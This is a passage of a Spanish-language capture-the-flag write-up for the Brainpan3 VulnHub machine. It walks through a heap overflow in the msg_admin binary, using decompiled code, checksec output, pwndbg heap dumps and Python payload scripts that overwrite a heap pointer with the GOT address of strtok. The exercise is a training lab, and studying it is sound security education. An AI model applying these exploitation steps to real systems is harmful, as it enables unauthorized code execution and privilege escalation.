+</span><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">ida</code> podemos decompilar este ultimo binario para ver su pseudocodigo <code class="language-plaintext highlighter-rouge">C</code></p>
+<a href="/vulnhub/brainpan3/8.png" target="_blank"><div><p><img src="/vulnhub/brainpan3/8.png"></p></div></a>
+
+<p class="plain-text">Resumiendo el codigo este usa nuevamente funciones vulnerables como <code class="language-plaintext highlighter-rouge">strcpy</code>, recibe 2 parametros que lee por cada linea de un archivo separandolos por <code class="language-plaintext highlighter-rouge">|</code>, tambien vemos algunas llamadas a <code class="language-plaintext highlighter-rouge">malloc</code> por lo que sabemos que usa el <code class="language-plaintext highlighter-rouge">heap</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int </span><span class="p">__cdecl </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)  
+{
+  </span><span class="no">void </span><span class="o">*</span><span class="p">stack; </span><span class="c1">// esp
+  </span><span class="no">int </span><span class="p">input_number_1; </span><span class="c1">// ebx
+  </span><span class="no">int </span><span class="p">input_number_2; </span><span class="c1">// ebx
+  </span><span class="no">int </span><span class="p">input_count; </span><span class="c1">// ebx
+  </span><span class="no">int </span><span class="p">input_buffer; </span><span class="c1">// [esp-Ch] [ebp-8Ch] BYREF
+  </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="p">argument; </span><span class="c1">// [esp+0h] [ebp-80h]
+  </span><span class="no">int </span><span class="p">counter; </span><span class="c1">// [esp+4h] [ebp-7Ch]
+  </span><span class="no">int </span><span class="p">alloc_1; </span><span class="c1">// [esp+Ch] [ebp-74h] BYREF
+  </span><span class="no">int </span><span class="p">alloc; </span><span class="c1">// [esp+10h] [ebp-70h]
+  </span><span class="no">int </span><span class="p">i; </span><span class="c1">// [esp+14h] [ebp-6Ch]
+  </span><span class="no">int </span><span class="p">data; </span><span class="c1">// [esp+18h] [ebp-68h]
+  </span><span class="no">int </span><span class="p">len; </span><span class="c1">// [esp+1Ch] [ebp-64h]
+  </span><span class="no">int </span><span class="p">value; </span><span class="c1">// [esp+20h] [ebp-60h]
+  </span><span class="no">int </span><span class="o">*</span><span class="p">memory_alloc; </span><span class="c1">// [esp+24h] [ebp-5Ch]
+  </span><span class="no">int </span><span class="p">file; </span><span class="c1">// [esp+28h] [ebp-58h]
+  </span><span class="no">int </span><span class="p">alloc_size; </span><span class="c1">// [esp+2Ch] [ebp-54h]
+  </span><span class="no">int </span><span class="p">alloc_value; </span><span class="c1">// [esp+30h] [ebp-50h]
+  </span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">delimiter; </span><span class="c1">// [esp+34h] [ebp-4Ch]
+  </span><span class="no">int </span><span class="p">string; </span><span class="c1">// [esp+38h] [ebp-48h]
+  </span><span class="no">int </span><span class="p">input[</span><span class="mi">17</span><span class="p">]; </span><span class="c1">// [esp+3Ch] [ebp-44h] BYREF
+
+  </span><span class="p">input[</span><span class="mi">13</span><span class="p">] </span><span class="o">=</span><span class="p"> (</span><span class="no">int</span><span class="p">)</span><span class="o">&</span><span class="p">argc;
+  counter </span><span class="o">= </span><span class="p">argc;
+  argument </span><span class="o">= </span><span class="p">argv;
+  input[</span><span class="mi">10</span><span class="p">] </span><span class="o">=</span><span class="p"> __readgsdword(</span><span class="mi">0x14</span><span class="no">u</span><span class="p">);
+  data </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+  len </span><span class="o">= </span><span class="mi">10</span><span class="p">;
+  alloc </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+  i </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+  value </span><span class="o">= </span><span class="mi">399</span><span class="p">;
+  stack </span><span class="o">= </span><span class="p">alloca(</span><span class="mi">400</span><span class="p">);
+  memory_alloc </span><span class="o">= </span><span class="o">&</span><span class="p">input_buffer;
+  </span><span class="o">if</span><span class="p"> ( argc </span><span class="o">> </span><span class="mi">2</span><span class="p"> )
+  {
+    data </span><span class="o">= </span><span class="no">atol</span><span class="p">(argument[</span><span class="mi">1</span><span class="p">]);
+    file </span><span class="o">= </span><span class="no">fopen</span><span class="p">(argument[</span><span class="mi">2</span><span class="p">], </span><span class="s">"r"</span><span class="p">);
+    alloc_1 </span><span class="o">= </span><span class="no">malloc</span><span class="p">(</span><span class="mi">400</span><span class="p">);
+    alloc_size </span><span class="o">= </span><span class="no">malloc</span><span class="p">(</span><span class="mi">20</span><span class="p">);
+    alloc_value </span><span class="o">= </span><span class="no">malloc</span><span class="p">(</span><span class="mi">100</span><span class="p">);
+    </span><span class="o">while</span><span class="p"> ( getline(</span><span class="o">&</span><span class="p">alloc_1, </span><span class="o">&</span><span class="p">LINEMAX_2, file) </span><span class="o">> </span><span class="mi">0 </span><span class="p">)
+      </span><span class="o">++</span><span class="p">alloc;
+    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] Recording </span><span class="mi">%d </span><span class="s">entries</span><span class="mi">\n</span><span class="s">"</span><span class="p">, alloc);
+    </span><span class="no">rewind</span><span class="p">(file);
+    </span><span class="o">for</span><span class="p"> ( i </span><span class="o">= </span><span class="mi">0</span><span class="p">; i </span><span class="o">< </span><span class="p">alloc; </span><span class="o">++</span><span class="p">i )
+    {
+      input[i] </span><span class="o">= </span><span class="no">malloc</span><span class="p">(</span><span class="mi">12</span><span class="p">);
+      </span><span class="o">*</span><span class="p">(_DWORD </span><span class="o">*</span><span class="p">)input[i] </span><span class="o">= </span><span class="p">data;
+      input_number_1 </span><span class="o">= </span><span class="p">input[i];
+      </span><span class="o">*</span><span class="p">(_DWORD </span><span class="o">*</span><span class="p">)(input_number_1 </span><span class="o">+ </span><span class="mi">4</span><span class="p">)</span><span class="o"> = </span><span class="no">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);
+      input_number_2 </span><span class="o">= </span><span class="p">input[i];
+      </span><span class="o">*</span><span class="p">(_DWORD </span><span class="o">*</span><span class="p">)(input_number_2 </span><span class="o">+ </span><span class="mi">8</span><span class="p">)</span><span class="o"> = </span><span class="no">malloc</span><span class="p">(</span><span class="mi">200</span><span class="p">);
+    }
+    </span><span class="o">for </span><span class="p">( i </span><span class="o">= </span><span class="mi">0</span><span class="p">; i </span><span class="o">< </span><span class="p">alloc; </span><span class="o">++</span><span class="p">i )
+    {
+      delimiter </span><span class="o">=</span><span class="s"> "|"</span><span class="p">;
+      </span><span class="o">if</span><span class="p"> ( getline(</span><span class="o">&</span><span class="p">alloc_1, </span><span class="o">&</span><span class="p">LINEMAX_2, file) </span><span class="o">> </span><span class="mi">1 </span><span class="p">)
+      {
+        input_count </span><span class="o">= </span><span class="p">alloc_1;
+        </span><span class="o">*</span><span class="p">(_BYTE </span><span class="o">*</span><span class="p">)(input_count </span><span class="o">+ </span><span class="no">strlen</span><span class="p">(alloc_1) </span><span class="o">- </span><span class="mi">1</span><span class="p">)</span><span class="o"> = </span><span class="mi">0</span><span class="p">;
+        string </span><span class="o">= </span><span class="no">strtok</span><span class="p">(alloc_1, delimiter);
+        </span><span class="no">strcpy</span><span class="p">(</span><span class="o">*</span><span class="p">(_DWORD </span><span class="o">*</span><span class="p">)(input[i] </span><span class="o">+ </span><span class="mi">4</span><span class="p">), string);
+        string </span><span class="o">= </span><span class="no">strtok</span><span class="p">(</span><span class="mi">0</span><span class="p">, delimiter);
+        </span><span class="no">strcpy</span><span class="p">(</span><span class="o">*</span><span class="p">(_DWORD </span><span class="o">*</span><span class="p">)(input[i] </span><span class="o">+ </span><span class="mi">8</span><span class="p">), string);
+        </span><span class="no">strncpy</span><span class="p">(memory_alloc, </span><span class="o">*</span><span class="p">(_DWORD </span><span class="o">*</span><span class="p">)(input[i] </span><span class="o">+ </span><span class="mi">8</span><span class="p">), </span><span class="mi">100</span><span class="p">);
+      }
+    }
+    </span><span class="no">fclose</span><span class="p">(file);
+    notify_admin(input, alloc);
+    </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+  }
+  </span><span class="o">else</span><span class="p">
+  {
+    usage(</span><span class="o">*</span><span class="p">argument);
+    </span><span class="no">return </span><span class="mi">1</span><span class="p">;
+  }
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mirando las protecciones usando <code class="language-plaintext highlighter-rouge">checksec</code> encontramos <code class="language-plaintext highlighter-rouge">NX</code> y <code class="language-plaintext highlighter-rouge">Canary</code> habilitadas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec </span><span class="p">msg_admin
+[</span><span class="az">*</span><span class="p">] '/home/kali/msg_admin'
+    Arch:     i386-32-little
+    RELRO:    </span><span class="am">Partial RELRO</span><span class="p">
+    Stack:    </span><span class="ve">Canary found</span><span class="p">
+    NX:       </span><span class="ve">NX enabled</span><span class="p">
+    PIE:      </span><span class="ro">No PIE (0x8048000)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que toma los argumentos de un archivo podemos crear un <code class="language-plaintext highlighter-rouge">.msg</code> de 2 lineas y pasando los argumentos con <code class="language-plaintext highlighter-rouge">10</code> y <code class="language-plaintext highlighter-rouge">200</code> bytes respectivamente separandolos por <code class="language-plaintext highlighter-rouge">|</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="p">
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">10</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"|"</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">200</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\n</span><span class="s">"</span><span class="p">
+
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">10</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"|"</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D"</span><span class="o"> * </span><span class="mi">200</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\n</span><span class="s">"</span><span class="p">
+
+</span><span class="o">with </span><span class="no">open</span><span class="p">(</span><span class="s">"exploit.msg"</span><span class="p">, </span><span class="s">"wb"</span><span class="p">) </span><span class="o">as </span><span class="p">file:
+    file.write(payload)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos ejecutarlo como se muestra en la tarea cron con <code class="language-plaintext highlighter-rouge">1</code> como primer argumento y el nombre del <code class="language-plaintext highlighter-rouge">exploit.msg</code> que creamos como segundo argumento</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb</span><span class="p"> -q msg_admin
+Reading symbols from </span><span class="ve">msg_admin</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">msg_admin</span><span class="p">)
+</span><span class="ro">pwndbg> </span><span class="p">run 1 exploit.msg
+Starting program: </span><span class="ve">/home/kali/msg_admin </span><span class="p">1 exploit.msg  
+[+] Recording 2 entries
+[+] Message from AAAAAAAAAA@kali
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0xf7e899e4 </span><span class="p">in </span><span class="am">fputs </span><span class="p">() from </span><span class="ve">./libc.so.6
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sabemos que ejecuta algunos <code class="language-plaintext highlighter-rouge">malloc</code> asi que con <code class="language-plaintext highlighter-rouge">vis</code> veamos el <code class="language-plaintext highlighter-rouge">heap</code> para ver como se representan los datos, en el chunk en <code class="language-plaintext highlighter-rouge">0x804c474</code> podemos ver 2 punteros, uno en <code class="language-plaintext highlighter-rouge">0x804c47c</code> y otro en <code class="language-plaintext highlighter-rouge">0x804c480</code> que tal vez podemos sobreescribir</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">vis 5 0x804c390
+0x804c390	</span><span class="am">0x0804c3a8	</span><span class="az">0x00000011	........</span><span class="p">  
+0x804c398	</span><span class="az">0x41414141	0x41414141	AAAAAAAA</span><span class="p">
+0x804c3a0	</span><span class="az">0x00004141	</span><span class="sa">0x000000d1	AA......</span><span class="p">
+0x804c3a8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3b0	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3b8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3c0	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3c8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3d0	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3d8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3e0	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3e8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3f0	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3f8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c400	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c408	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c410	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c418	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c420	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c428	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c430	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c438	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c440	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c448	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c450	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c458	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c460	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c468	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c470	</span><span class="sa">0x00000000	</span><span class="ve">0x00000011	........</span><span class="p">
+0x804c478	</span><span class="ve">0x00000001	0x0804c488	........</span><span class="p">
+0x804c480	</span><span class="ve">0x0804c498	</span><span class="az">0x00000011	........</span><span class="p">
+0x804c488	</span><span class="az">0x43434343	0x43434343	CCCCCCCC</span><span class="p">
+0x804c490	</span><span class="az">0x00004343	</span><span class="am">0x000000d1	CC......</span><span class="p">
+0x804c498	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4a0	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4a8	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4b0	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4b8	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4c0	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4c8	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4d0	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4d8	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4e0	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4e8	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4f0	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c4f8	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c500	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c508	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c510	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c518	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c520	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c528	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c530	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c538	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c540	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c548	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c550	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c558	</span><span class="am">0x44444444	0x44444444	DDDDDDDD</span><span class="p">
+0x804c560	</span><span class="am">0x00000000</span><span class="p">
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Antes de sobreescribir el puntero en <code class="language-plaintext highlighter-rouge">0x804c47c</code> tenemos que rellenar <code class="language-plaintext highlighter-rouge">3</code> dwords por lo que añadiremos <code class="language-plaintext highlighter-rouge">12 B's</code> y despues de ello sobreescribimos el puntero con <code class="language-plaintext highlighter-rouge">4 C's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="p">
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">10</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"|"</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">212</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">4</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\n</span><span class="s">"</span><span class="p">
+
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="mi">10</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"|"</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"E" </span><span class="o">* </span><span class="mi">200</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="p">"</span><span class="mi">\n</span><span class="s">"</span><span class="p">
+
+</span><span class="o">with </span><span class="no">open</span><span class="p">(</span><span class="s">"exploit.msg"</span><span class="p">,</span><span class="s"> "wb"</span><span class="p">) </span><span class="o">as </span><span class="p">file:
+    file.write(payload)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si corremos el programa con el nuevo msg en el heap ahora la direccion <code class="language-plaintext highlighter-rouge">0x804c47c</code> donde estaba el puntero vale <code class="language-plaintext highlighter-rouge">C's</code>, pero el <code class="language-plaintext highlighter-rouge">chunk</code> es gigante incluso sobrepasando el <code class="language-plaintext highlighter-rouge">top chunk</code> y esto es porque sobrescribimos el <code class="language-plaintext highlighter-rouge">dword</code> del tamaño con <code class="language-plaintext highlighter-rouge">0x42424242</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb </span><span class="p">-q msg_admin
+Reading symbols from </span><span class="ve">msg_admin</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">msg_admin</span><span class="p">)
+</span><span class="ro">pwndbg> </span><span class="p">run 1 exploit.msg
+Starting program: </span><span class="ve">/home/kali/msg_admin </span><span class="p">1 exploit.msg
+[+] Recording 2 entries
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0xf7eaa0f7 </span><span class="p">in </span><span class="am">??</span><span class="p"> () from </span><span class="ve">./libc.so.6
+</span><span class="ro">pwndbg> </span><span class="p">vis 3 0x804c390
+0x804c390	</span><span class="am">0x0804c3a8	</span><span class="az">0x00000011	........</span><span class="p">
+0x804c398	</span><span class="az">0x41414141	0x41414141	AAAAAAAA</span><span class="p">
+0x804c3a0	</span><span class="az">0x00004141	</span><span class="sa">0x000000d1	AA......</span><span class="p">
+0x804c3a8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3b0	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3b8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3c0	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3c8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3d0	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3d8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3e0	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3e8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3f0	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c3f8	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c400	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c408	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c410	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c418	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c420	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c428	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c430	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c438	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c440	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c448	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c450	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c458	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c460	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c468	</span><span class="sa">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c470	</span><span class="ve">0x42424242	0x42424242	BBBBBBBB</span><span class="p">
+0x804c478	</span><span class="ve">0x42424242	0x43434343	BBBBCCCC</span><span class="p">
+0x804c480	</span><span class="ve">0x0804c400	0x00000011	........</span><span class="p">
+0x804c488	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c490	</span><span class="ve">0x00000000	0x000000d1	........</span><span class="p">
+0x804c498	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4a0	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4a8	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4b0	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4b8	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4c0	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4c8	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4d0	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4d8	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4e0	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4e8	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4f0	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c4f8	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c500	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c508	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c510	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c518	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c520	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c528	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c530	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c538	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c540	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c548	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c550	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c558	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c560	</span><span class="ve">0x00000000	0x00020aa1	........</span><span class="p">	 <-- Top chunk  
+0x804c568	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c570	</span><span class="ve">0x00000000	0x00000000	........</span><span class="p">
+0x804c578	</span><span class="ve">0x00000000	0x00000000	........</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para lo siguiente necesitaremos obtener la direccion <code class="language-plaintext highlighter-rouge">got</code> de la funcion <code class="language-plaintext highlighter-rouge">strtok</code> ya que si enviamos esta direccion en lugar del puntero nos llevara a las <code class="language-plaintext highlighter-rouge">C's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">got -r strtok
+Filtering by symbol name: </span><span class="am">strtok</span><span class="p">
+
+State of the GOT of </span><span class="sa">/home/kali/msg_admin</span><span class="p">:
+GOT protection: </span><span class="am">Partial RELRO</span><span class="p"> | Found </span><span class="am">1 </span><span class="p">GOT entries passing the filter
+[</span><span class="sa">0x804b05c</span><span class="p">] </span><span class="am">strtok@GLIBC_2.0</span><span class="p"> -> </span><span class="ro">0xf7ea1970 (strtok)</span><span class="p"> —▸ 0xffeae853 ◂— 0xffeae853  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esta vez en las <code class="language-plaintext highlighter-rouge">B's</code> enviaremos <code class="language-plaintext highlighter-rouge">212</code> bytes de basura y en el inicio del puntero la direccion del got de <code class="language-plaintext highlighter-rouge">strtok</code>, podemos usar <code class="language-plaintext highlighter-rouge">p32</code> de pwntools para no complicarnos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">p32
+
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">10</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"|"</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">212</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x804b05c</span><span class="p">)
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\n</span><span class="s">"</span><span class="p">
+
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">10</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"|"</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="mi">200</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\n</span><span class="p">"</span><span class="p">
+
+</span><span class="o">with </span><span class="no">open</span><span class="p">(</span><span class="s">"exploit.msg"</span><span class="p">, </span><span class="s">"wb"</span><span class="p">) </span><span class="o">as </span><span class="p">file:
+    file.write(payload)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py</span>
+</code></pre></div></div><br>
+
